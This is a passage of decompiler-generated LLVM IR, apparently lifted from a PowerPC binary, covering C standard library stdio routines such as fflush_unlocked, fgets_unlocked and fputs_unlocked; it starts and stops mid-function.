  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_10009828, i32* %r29.global-to-local, align 4
  %v2_10009848 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009848, i32* @r3, align 4
  %v1_1000984c = add i32 %arg2, 52
  %v2_1000984c = inttoptr i32 %v1_1000984c to i32*
  %v3_1000984c = load i32, i32* %v2_1000984c, align 4
  %v3_10009858 = icmp eq i32 %v3_1000984c, 0
  store i1 %v3_10009858, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10009858, label %dec_label_pc_10009860, label %dec_label_pc_1000986c

dec_label_pc_10009860:                            ; preds = %entry
  %v0_10009860 = call i32 @__pthread_return_void()
  %v0_10009868 = call i32 @__pthread_return_0()
  %v0_1000986c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009870.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000986c

dec_label_pc_1000986c:                            ; preds = %entry, %dec_label_pc_10009860
  %v0_10009870 = phi i32 [ %v0_10009828, %entry ], [ %v0_10009870.pre, %dec_label_pc_10009860 ]
  %v0_1000986c = phi i32 [ %arg2, %entry ], [ %v0_1000986c.pre, %dec_label_pc_10009860 ]
  store i32 268474488, i32* @lr, align 4
  %v2_10009874 = call i32 @__GI_fputs_unlocked(i32 %v0_10009870, i32 %v0_1000986c)
  store i32 %v2_10009874, i32* %r31.global-to-local, align 4
  store i32 %v2_10009848, i32* @r3, align 4
  %v0_10009884 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10009884, label %dec_label_pc_10009888, label %dec_label_pc_1000988c

dec_label_pc_10009888:                            ; preds = %dec_label_pc_1000986c
  %v0_10009888 = call i32 @__pthread_return_void()
  %v0_10009890.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000988c

dec_label_pc_1000988c:                            ; preds = %dec_label_pc_1000986c, %dec_label_pc_10009888
  %v0_10009890 = phi i32 [ %v2_10009874, %dec_label_pc_1000986c ], [ %v0_10009890.pre, %dec_label_pc_10009888 ]
  %v1_100098a0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009828)
  %v9_100098a0 = extractvalue %0 %v1_100098a0, 7
  store i4 %v9_100098a0, i4* @cr4, align 1
  ret i32 %v0_10009890

; uselistorder directives
  uselistorder i32 %v0_10009828, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_1000988c, { 1, 0 }
  uselistorder label %dec_label_pc_1000986c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c114.562 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100246cc.563 to i32), i32* @r29, align 4
  %v2_100098d0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100098d0, i32* @r3, align 4
  %v0_100098d8 = call i32 @__pthread_return_void()
  %v0_100098e0 = call i32 @__pthread_return_0()
  %v3_100098e8 = load i32, i32* @global_var_10024a60.564, align 4
  %v3_100098ec = icmp eq i32 %v3_100098e8, 1
  br i1 %v3_100098ec, label %dec_label_pc_100098f4, label %dec_label_pc_1000999c

dec_label_pc_100098f4:                            ; preds = %entry
  %v3_100098f8 = load i32, i32* @global_var_10024a64.565, align 4
  %tmp7 = icmp slt i32 %v3_100098f8, 1
  br i1 %tmp7, label %dec_label_pc_1000999c, label %dec_label_pc_10009904

dec_label_pc_10009904:                            ; preds = %dec_label_pc_100098f4
  %v2_10009910 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009910, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000991c = call i32 @__pthread_return_void()
  %v0_10009924 = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000997c11 = icmp eq i32 %storemerge8, 0
  %v0_1000998012 = load i32, i32* @r30, align 4
  br i1 %v3_1000997c11, label %dec_label_pc_10009988, label %dec_label_pc_10009934

dec_label_pc_10009934:                            ; preds = %dec_label_pc_10009904, %dec_label_pc_1000997c.backedge
  %v0_1000998017 = phi i32 [ %v0_10009980, %dec_label_pc_1000997c.backedge ], [ %v0_1000998012, %dec_label_pc_10009904 ]
  %v3_1000998018.in = phi i32 [ %v0_10009980, %dec_label_pc_1000997c.backedge ], [ %v0_1000998012, %dec_label_pc_10009904 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_1000997c.backedge ], [ %storemerge8, %dec_label_pc_10009904 ]
  %v1_10009934 = inttoptr i32 %storemerge16 to i16*
  %v2_10009934 = load i16, i16* %v1_10009934, align 2
  %v1_10009938 = add i32 %storemerge16, 32
  %v2_10009938 = inttoptr i32 %v1_10009938 to i32*
  %v3_10009938 = load i32, i32* %v2_10009938, align 4
  store i32 %v3_10009938, i32* @r31, align 4
  %v1_1000993c = and i16 %v2_10009934, -32720
  %v3_10009940 = icmp eq i16 %v1_1000993c, 48
  br i1 %v3_10009940, label %dec_label_pc_10009950, label %dec_label_pc_10009948

dec_label_pc_10009948:                            ; preds = %dec_label_pc_10009934
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_1000997c.backedge

dec_label_pc_10009950:                            ; preds = %dec_label_pc_10009934
  %v3_1000998018 = icmp eq i32 %v3_1000998018.in, 0
  br i1 %v3_1000998018, label %dec_label_pc_10009954, label %dec_label_pc_10009960

dec_label_pc_10009954:                            ; preds = %dec_label_pc_10009950
  store i32 %v3_10009938, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  br label %dec_label_pc_10009964

dec_label_pc_10009960:                            ; preds = %dec_label_pc_10009950
  %v2_10009960 = add i32 %v0_1000998017, 32
  %v3_10009960 = inttoptr i32 %v2_10009960 to i32*
  store i32 %v3_10009938, i32* %v3_10009960, align 4
  %v0_10009964.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009964

dec_label_pc_10009964:                            ; preds = %dec_label_pc_10009954, %dec_label_pc_10009960
  %v0_10009964 = phi i32 [ %storemerge16, %dec_label_pc_10009954 ], [ %v0_10009964.pre, %dec_label_pc_10009960 ]
  %v1_10009964 = inttoptr i32 %v0_10009964 to i16*
  %v2_10009964 = load i16, i16* %v1_10009964, align 2
  store i32 %v0_10009964, i32* @r3, align 4
  %v1_1000996c = and i16 %v2_10009964, 8192
  %v3_1000996c = icmp eq i16 %v1_1000996c, 0
  br i1 %v3_1000996c, label %dec_label_pc_1000997c.backedge, label %dec_label_pc_10009974

dec_label_pc_1000997c.backedge:                   ; preds = %dec_label_pc_10009964, %dec_label_pc_10009948, %dec_label_pc_10009974
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000997c = icmp eq i32 %storemerge, 0
  %v0_10009980 = load i32, i32* @r30, align 4
  br i1 %v3_1000997c, label %dec_label_pc_10009988, label %dec_label_pc_10009934

dec_label_pc_10009974:                            ; preds = %dec_label_pc_10009964
  store i32 268474744, i32* @lr, align 4
  %v0_10009974 = call i32 @free()
  br label %dec_label_pc_1000997c.backedge

dec_label_pc_10009988:                            ; preds = %dec_label_pc_1000997c.backedge, %dec_label_pc_10009904
  store i32 %v2_10009910, i32* @r3, align 4
  %v0_10009990 = call i32 @__pthread_return_void()
  %v0_10009998 = load i32, i32* @r29, align 4
  store i32 %v0_10009998, i32* @global_var_10024a64.565, align 4
  %v3_100099a4.pre = load i32, i32* @global_var_10024a60.564, align 4
  br label %dec_label_pc_1000999c

dec_label_pc_1000999c:                            ; preds = %entry, %dec_label_pc_100098f4, %dec_label_pc_10009988
  %v3_100099a4 = phi i32 [ %v3_100098e8, %entry ], [ 1, %dec_label_pc_100098f4 ], [ %v3_100099a4.pre, %dec_label_pc_10009988 ]
  store i32 %v2_100098d0, i32* @r3, align 4
  %v1_100099ac = add i32 %v3_100099a4, -1
  store i32 %v1_100099ac, i32* @global_var_10024a60.564, align 4
  %v0_100099b4 = call i32 @__pthread_return_void()
  ret i32 %v0_100099b4

; uselistorder directives
  uselistorder i32 %v0_10009980, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10009964, { 1, 0 }
  uselistorder i32 %v3_10009938, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000999c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000997c.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009964, { 1, 0 }
  uselistorder label %dec_label_pc_10009934, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10024a10.570 to i32), i32* %r9.global-to-local, align 4
  %v5_100099dc = icmp eq i16* %arg1, bitcast (i32** @global_var_10024a10.570 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_100099dc, label %dec_label_pc_10009a00, label %dec_label_pc_100099f4

dec_label_pc_100099f4:                            ; preds = %entry
  %v4_100099f4 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_100099f4, label %dec_label_pc_10009a00, label %dec_label_pc_10009b2c

dec_label_pc_10009a00:                            ; preds = %dec_label_pc_100099f4, %entry
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c114.562 to i32), i32* @r30, align 4
  %v2_10009a0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v0_10009a20 = call i32 @__pthread_return_void()
  %v0_10009a28 = call i32 @__pthread_return_0()
  %v3_10009a30 = load i32, i32* @global_var_10024a60.564, align 4
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v1_10009a40 = add i32 %v3_10009a30, 1
  store i32 %v1_10009a40, i32* %r9.global-to-local, align 4
  store i32 %v1_10009a40, i32* @global_var_10024a60.564, align 4
  %v0_10009a4c = call i32 @__pthread_return_void()
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v0_10009a5c = call i32 @__pthread_return_void()
  %v0_10009a64 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v3_10009a70 = load i32, i32* bitcast (i32** @global_var_10024a10.570 to i32*), align 4
  store i32 %v3_10009a70, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10009a7c = call i32 @__pthread_return_void()
  %v0_10009b1c.pr = load i32, i32* @r31, align 4
  %v3_10009b1c3 = icmp eq i32 %v0_10009b1c.pr, 0
  br i1 %v3_10009b1c3, label %dec_label_pc_10009b24, label %dec_label_pc_10009a84

dec_label_pc_10009a84:                            ; preds = %dec_label_pc_10009a00, %dec_label_pc_10009b18
  %v0_10009aa0 = phi i32 [ %v3_10009b18, %dec_label_pc_10009b18 ], [ %v0_10009b1c.pr, %dec_label_pc_10009a00 ]
  %v1_10009a84 = inttoptr i32 %v0_10009aa0 to i16*
  %v2_10009a84 = load i16, i16* %v1_10009a84, align 2
  %v3_10009a84 = zext i16 %v2_10009a84 to i32
  %v1_10009a88 = and i32 %v3_10009a84, 64
  store i32 %v1_10009a88, i32* %r9.global-to-local, align 4
  %v3_10009a88 = icmp eq i32 %v1_10009a88, 0
  br i1 %v3_10009a88, label %dec_label_pc_10009b18, label %dec_label_pc_10009a90

dec_label_pc_10009a90:                            ; preds = %dec_label_pc_10009a84
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009a94 = load i32, i32* @global_var_10024a14.568, align 4
  %v3_10009a98 = icmp eq i32 %v3_10009a94, 2
  br i1 %v3_10009a98, label %dec_label_pc_10009abc, label %dec_label_pc_10009aa0

dec_label_pc_10009aa0:                            ; preds = %dec_label_pc_10009a90
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v0_10009ab0 = call i32 @__pthread_return_void()
  %v0_10009ab8 = call i32 @__pthread_return_0()
  %v0_10009abc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009abc

dec_label_pc_10009abc:                            ; preds = %dec_label_pc_10009a90, %dec_label_pc_10009aa0
  %v0_10009ad0 = phi i32 [ %v0_10009aa0, %dec_label_pc_10009a90 ], [ %v0_10009abc.pre, %dec_label_pc_10009aa0 ]
  %v1_10009abc = inttoptr i32 %v0_10009ad0 to i16*
  %v2_10009abc = load i16, i16* %v1_10009abc, align 2
  %v3_10009abc = zext i16 %v2_10009abc to i32
  %v0_10009ac0 = load i32, i32* @r27, align 4
  %v2_10009ac0 = or i32 %v0_10009ac0, %v3_10009abc
  %v1_10009ac4 = and i32 %v2_10009ac0, 832
  %v1_10009ac8 = xor i32 %v1_10009ac4, 320
  store i32 %v1_10009ac8, i32* %r9.global-to-local, align 4
  %v3_10009ac8 = icmp eq i32 %v1_10009ac8, 0
  br i1 %v3_10009ac8, label %dec_label_pc_10009ad0, label %dec_label_pc_10009afc

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009abc
  store i32 %v0_10009ad0, i32* @r3, align 4
  store i32 268475096, i32* @lr, align 4
  %v0_10009ad4 = call i32 @__stdio_wcommit()
  %v3_10009ad8 = icmp eq i32 %v0_10009ad4, 0
  br i1 %v3_10009ad8, label %dec_label_pc_10009ae8, label %dec_label_pc_10009ae0

dec_label_pc_10009ae0:                            ; preds = %dec_label_pc_10009ad0
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10009afc

dec_label_pc_10009ae8:                            ; preds = %dec_label_pc_10009ad0
  %v0_10009ae8 = load i32, i32* @r31, align 4
  %v1_10009ae8 = inttoptr i32 %v0_10009ae8 to i16*
  %v2_10009ae8 = load i16, i16* %v1_10009ae8, align 2
  %v3_10009ae8 = zext i16 %v2_10009ae8 to i32
  %v1_10009aec = add i32 %v0_10009ae8, 8
  %v2_10009aec = inttoptr i32 %v1_10009aec to i32*
  %v3_10009aec = load i32, i32* %v2_10009aec, align 4
  store i32 %v3_10009aec, i32* %r9.global-to-local, align 4
  %v1_10009af0 = call i32 @__asm_rlwinm(i32 %v3_10009ae8, i32 0, i32 26, i32 24)
  %v2_10009af0 = trunc i32 %v1_10009af0 to i16
  %v1_10009af4 = load i32, i32* @r31, align 4
  %v2_10009af4 = add i32 %v1_10009af4, 28
  %v3_10009af4 = inttoptr i32 %v2_10009af4 to i32*
  store i32 %v3_10009aec, i32* %v3_10009af4, align 4
  %v3_10009af8 = load i32, i32* @r31, align 4
  %v4_10009af8 = inttoptr i32 %v3_10009af8 to i16*
  store i16 %v2_10009af0, i16* %v4_10009af8, align 2
  br label %dec_label_pc_10009afc

dec_label_pc_10009afc:                            ; preds = %dec_label_pc_10009abc, %dec_label_pc_10009ae0, %dec_label_pc_10009ae8
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009b00 = load i32, i32* @global_var_10024a14.568, align 4
  %v3_10009b04 = icmp eq i32 %v3_10009b00, 2
  br i1 %v3_10009b04, label %dec_label_pc_10009b18, label %dec_label_pc_10009b0c

dec_label_pc_10009b0c:                            ; preds = %dec_label_pc_10009afc
  store i32 %v2_10009a0c, i32* @r3, align 4
  %v0_10009b14 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009b18

dec_label_pc_10009b18:                            ; preds = %dec_label_pc_10009afc, %dec_label_pc_10009a84, %dec_label_pc_10009b0c
  %v0_10009b18 = load i32, i32* @r31, align 4
  %v1_10009b18 = add i32 %v0_10009b18, 32
  %v2_10009b18 = inttoptr i32 %v1_10009b18 to i32*
  %v3_10009b18 = load i32, i32* %v2_10009b18, align 4
  store i32 %v3_10009b18, i32* @r31, align 4
  %v3_10009b1c = icmp eq i32 %v3_10009b18, 0
  br i1 %v3_10009b1c, label %dec_label_pc_10009b24, label %dec_label_pc_10009a84

dec_label_pc_10009b24:                            ; preds = %dec_label_pc_10009b18, %dec_label_pc_10009a00
  store i32 ptrtoint (i32* @global_var_10009b28.593 to i32), i32* @lr, align 4
  %v0_10009b24 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_10009b64

dec_label_pc_10009b2c:                            ; preds = %dec_label_pc_100099f4
  %v3_10009b2c = load i16, i16* %arg1, align 2
  %v4_10009b2c = zext i16 %v3_10009b2c to i32
  store i32 0, i32* @r28, align 4
  %v1_10009b34 = and i32 %v4_10009b2c, 64
  store i32 %v1_10009b34, i32* %r9.global-to-local, align 4
  %v3_10009b34 = icmp eq i32 %v1_10009b34, 0
  br i1 %v3_10009b34, label %dec_label_pc_10009b64, label %dec_label_pc_10009b3c

dec_label_pc_10009b3c:                            ; preds = %dec_label_pc_10009b2c
  store i32 268475200, i32* @lr, align 4
  %v0_10009b3c = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_10009b44 = icmp eq i32 %v0_10009b3c, 0
  br i1 %v3_10009b44, label %dec_label_pc_10009b4c, label %dec_label_pc_10009b64

dec_label_pc_10009b4c:                            ; preds = %dec_label_pc_10009b3c
  %v0_10009b4c = load i32, i32* @r29, align 4
  %v1_10009b4c = inttoptr i32 %v0_10009b4c to i16*
  %v2_10009b4c = load i16, i16* %v1_10009b4c, align 2
  %v3_10009b4c = zext i16 %v2_10009b4c to i32
  store i32 0, i32* @r28, align 4
  %v1_10009b54 = add i32 %v0_10009b4c, 8
  %v2_10009b54 = inttoptr i32 %v1_10009b54 to i32*
  %v3_10009b54 = load i32, i32* %v2_10009b54, align 4
  store i32 %v3_10009b54, i32* %r9.global-to-local, align 4
  %v1_10009b58 = call i32 @__asm_rlwinm(i32 %v3_10009b4c, i32 0, i32 26, i32 24)
  %v2_10009b58 = trunc i32 %v1_10009b58 to i16
  %v3_10009b5c = load i32, i32* @r29, align 4
  %v4_10009b5c = inttoptr i32 %v3_10009b5c to i16*
  store i16 %v2_10009b58, i16* %v4_10009b5c, align 2
  %v0_10009b60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009b60 = load i32, i32* @r29, align 4
  %v2_10009b60 = add i32 %v1_10009b60, 28
  %v3_10009b60 = inttoptr i32 %v2_10009b60 to i32*
  store i32 %v0_10009b60, i32* %v3_10009b60, align 4
  br label %dec_label_pc_10009b64

dec_label_pc_10009b64:                            ; preds = %dec_label_pc_10009b3c, %dec_label_pc_10009b2c, %dec_label_pc_10009b24, %dec_label_pc_10009b4c
  %v0_10009b68 = load i32, i32* @r28, align 4
  ret i32 %v0_10009b68

; uselistorder directives
  uselistorder i32 %v3_10009b18, { 1, 2, 0 }
  uselistorder i32 %v1_10009ac8, { 1, 0 }
  uselistorder i32 %v2_10009a0c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_10024a10.570 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10024a60.564, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10009b64, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009b18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009afc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009abc, { 1, 0 }
  uselistorder label %dec_label_pc_10009a84, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10009c24, label %dec_label_pc_10009b9c

dec_label_pc_10009b9c:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_10009c043 = add i32 %arg2, -1
  store i32 %v2_10009c043, i32* @r29, align 4
  %v4_10009c0c9 = icmp eq i32 %arg2, 1
  br i1 %v4_10009c0c9, label %dec_label_pc_10009c10, label %dec_label_pc_10009ba4

dec_label_pc_10009ba4:                            ; preds = %dec_label_pc_10009b9c, %dec_label_pc_10009c04.backedge
  %v2_10009bc0 = phi i32 [ %v2_10009bc012, %dec_label_pc_10009c04.backedge ], [ %tmp, %dec_label_pc_10009b9c ]
  %v0_10009ba4 = phi i32 [ %v0_10009c08, %dec_label_pc_10009c04.backedge ], [ %arg3, %dec_label_pc_10009b9c ]
  %v1_10009ba4 = add i32 %v0_10009ba4, 16
  %v2_10009ba4 = inttoptr i32 %v1_10009ba4 to i32*
  %v3_10009ba4 = load i32, i32* %v2_10009ba4, align 4
  %v1_10009ba8 = add i32 %v0_10009ba4, 24
  %v2_10009ba8 = inttoptr i32 %v1_10009ba8 to i32*
  %v3_10009ba8 = load i32, i32* %v2_10009ba8, align 4
  %v2_10009bac = add i32 %v3_10009ba4, 1
  store i32 %v2_10009bac, i32* %r11.global-to-local, align 4
  %v3_10009bb0 = icmp ult i32 %v3_10009ba4, %v3_10009ba8
  %v5_10009bb0 = icmp eq i32 %v3_10009ba4, %v3_10009ba8
  store i1 %v5_10009bb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009bb0, label %dec_label_pc_10009bb8, label %dec_label_pc_10009bd4

dec_label_pc_10009bb8:                            ; preds = %dec_label_pc_10009ba4
  %v4_10009ba4 = inttoptr i32 %v3_10009ba4 to i8*
  %v3_10009bb8 = load i8, i8* %v4_10009ba4, align 1
  %v3_10009bbc = icmp eq i8 %v3_10009bb8, 10
  store i1 %v3_10009bbc, i1* %cr7_eq.global-to-local, align 1
  %v3_10009bc0 = inttoptr i32 %v2_10009bc0 to i8*
  store i8 %v3_10009bb8, i8* %v3_10009bc0, align 1
  %v0_10009bc4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009bc4 = load i32, i32* @r30, align 4
  %v2_10009bc4 = add i32 %v1_10009bc4, 16
  %v3_10009bc4 = inttoptr i32 %v2_10009bc4 to i32*
  store i32 %v0_10009bc4, i32* %v3_10009bc4, align 4
  %v0_10009bc8 = load i32, i32* @r31, align 4
  %v1_10009bc8 = add i32 %v0_10009bc8, 1
  store i32 %v1_10009bc8, i32* @r31, align 4
  %v0_10009bcc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009bcc, label %dec_label_pc_10009c10, label %dec_label_pc_10009c04.backedge

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009ba4
  %v1_10009c0810 = inttoptr i32 %v0_10009ba4 to i16*
  store i32 268475352, i32* @lr, align 4
  %v5_10009bd4 = call i32 @getc_unlocked(i16* %v1_10009c0810, i32 %v3_10009ba4)
  %v6_10009bd4 = trunc i32 %v5_10009bd4 to i8
  %v4_10009bd8 = icmp eq i8 %v6_10009bd4, -1
  store i1 %v4_10009bd8, i1* %cr7_eq.global-to-local, align 1
  %v3_10009be0 = icmp eq i8 %v6_10009bd4, 10
  store i1 %v3_10009be0, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10009bd8, label %dec_label_pc_10009be8, label %dec_label_pc_10009bf8

dec_label_pc_10009be8:                            ; preds = %dec_label_pc_10009bd4
  %v0_10009be8 = load i32, i32* @r30, align 4
  %v1_10009be8 = inttoptr i32 %v0_10009be8 to i16*
  %v2_10009be8 = load i16, i16* %v1_10009be8, align 2
  %v1_10009bec = and i16 %v2_10009be8, 8
  %v3_10009bec = icmp eq i16 %v1_10009bec, 0
  br i1 %v3_10009bec, label %dec_label_pc_10009be8.dec_label_pc_10009c10_crit_edge, label %dec_label_pc_10009c24

dec_label_pc_10009be8.dec_label_pc_10009c10_crit_edge: ; preds = %dec_label_pc_10009be8
  %v0_10009c10.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009c10

dec_label_pc_10009bf8:                            ; preds = %dec_label_pc_10009bd4
  %v3_10009bf8 = load i32, i32* @r31, align 4
  %v4_10009bf8 = inttoptr i32 %v3_10009bf8 to i8*
  store i8 %v6_10009bd4, i8* %v4_10009bf8, align 1
  %v0_10009bfc = load i32, i32* @r31, align 4
  %v1_10009bfc = add i32 %v0_10009bfc, 1
  store i32 %v1_10009bfc, i32* @r31, align 4
  %v0_10009c00 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10009c00, label %dec_label_pc_10009c10, label %dec_label_pc_10009c04.backedge

dec_label_pc_10009c04.backedge:                   ; preds = %dec_label_pc_10009bf8, %dec_label_pc_10009bb8
  %v2_10009bc012 = phi i32 [ %v1_10009bfc, %dec_label_pc_10009bf8 ], [ %v1_10009bc8, %dec_label_pc_10009bb8 ]
  %v0_10009c04 = load i32, i32* @r29, align 4
  %v2_10009c04 = add i32 %v0_10009c04, -1
  store i32 %v2_10009c04, i32* @r29, align 4
  %v0_10009c08 = load i32, i32* @r30, align 4
  %v4_10009c0c = icmp eq i32 %v0_10009c04, 1
  br i1 %v4_10009c0c, label %dec_label_pc_10009c10, label %dec_label_pc_10009ba4

dec_label_pc_10009c10:                            ; preds = %dec_label_pc_10009bf8, %dec_label_pc_10009c04.backedge, %dec_label_pc_10009bb8, %dec_label_pc_10009b9c, %dec_label_pc_10009be8.dec_label_pc_10009c10_crit_edge
  %v2_10009c1c = phi i32 [ %v0_10009c10.pre, %dec_label_pc_10009be8.dec_label_pc_10009c10_crit_edge ], [ %tmp, %dec_label_pc_10009b9c ], [ %v1_10009bc8, %dec_label_pc_10009bb8 ], [ %v2_10009bc012, %dec_label_pc_10009c04.backedge ], [ %v1_10009bfc, %dec_label_pc_10009bf8 ]
  %v1_10009c10 = load i32, i32* @r28, align 4
  %v3_10009c10 = icmp ugt i32 %v2_10009c1c, %v1_10009c10
  %v4_10009c10 = icmp eq i32 %v2_10009c1c, %v1_10009c10
  store i1 %v4_10009c10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009c10, label %dec_label_pc_10009c18, label %dec_label_pc_10009c24

dec_label_pc_10009c18:                            ; preds = %dec_label_pc_10009c10
  %v3_10009c1c = inttoptr i32 %v2_10009c1c to i8*
  store i8 0, i8* %v3_10009c1c, align 1
  %v0_10009c2c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009c28

dec_label_pc_10009c24:                            ; preds = %dec_label_pc_10009be8, %dec_label_pc_10009c10, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10009c28

dec_label_pc_10009c28:                            ; preds = %dec_label_pc_10009c18, %dec_label_pc_10009c24
  %v0_10009c2c = phi i32 [ %v0_10009c2c.pre, %dec_label_pc_10009c18 ], [ 0, %dec_label_pc_10009c24 ]
  ret i32 %v0_10009c2c

; uselistorder directives
  uselistorder i32 %v2_10009c1c, { 0, 2, 1 }
  uselistorder i8 %v6_10009bd4, { 1, 0, 2 }
  uselistorder i32 %v3_10009ba8, { 1, 0 }
  uselistorder i32 %v3_10009ba4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10009ba4, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009c28, { 1, 0 }
  uselistorder label %dec_label_pc_10009c24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009c10, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10009ba4, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10009c58 = call i32 @__GI_strlen()
  store i32 %v0_10009c58, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10009c74.594 to i32), i32* @lr, align 4
  %v4_10009c70 = inttoptr i32 %arg2 to i16*
  %v5_10009c70 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10009c58, i16* %v4_10009c70)
  %v1_10009c78 = load i32, i32* @r27, align 4
  %v4_10009c78 = icmp eq i32 %v5_10009c70, %v1_10009c78
  br i1 %v4_10009c78, label %dec_label_pc_10009c80, label %dec_label_pc_10009c84

dec_label_pc_10009c80:                            ; preds = %entry
  br label %dec_label_pc_10009c84

dec_label_pc_10009c84:                            ; preds = %entry, %dec_label_pc_10009c80
  %v0_10009c84 = phi i32 [ -1, %entry ], [ %v5_10009c70, %dec_label_pc_10009c80 ]
  ret i32 %v0_10009c84

; uselistorder directives
  uselistorder label %dec_label_pc_10009c84, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10009cb4 = load i16, i16* %arg4, align 2
  %v4_10009cb4 = zext i16 %v3_10009cb4 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
